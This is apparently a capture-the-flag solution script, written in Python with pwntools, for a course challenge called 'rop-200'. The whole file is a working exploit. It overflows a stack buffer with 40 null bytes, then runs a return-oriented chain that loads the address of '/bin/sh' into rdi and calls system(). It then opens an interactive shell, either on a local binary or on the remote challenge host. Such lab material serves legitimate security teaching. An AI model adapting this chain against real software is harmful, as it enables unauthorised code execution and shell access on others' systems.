#!/usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
)

def start(binary):
    gs = '''
        init-pwndbg
        b *0x40118e

    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4830-rop-200.chals.io", 443, ssl=True, sni="cse4830-rop-200.chals.io")
    else:
        return process(binary)

def exploit(p,e,r):

    #pad = b'Schedule\x00' + b'A' * 31
    pad = b'\x00' * 40
    binsh = p64(next(e.search(b'/bin/sh\x00')))
    pop_rdi = p64(r.find_gadget(['pop rdi', 'ret'])[0])
    sys = p64(e.sym['system'])
    pop_rsi_r15 = p64(r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0])
    ret = p64(e.sym['_fini'])
    chain = pop_rdi + binsh +  pop_rsi_r15 + p64(0) + p64(0) + sys

    p.sendline(pad+chain)
    p.interactive()


if __name__=="__main__":
    file = './rop-200'

    p = start(file)
    #p = remote("cse4830-rop-200.chals.io", 443, ssl=True, sni="cse4830-rop-200.chals.io")
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
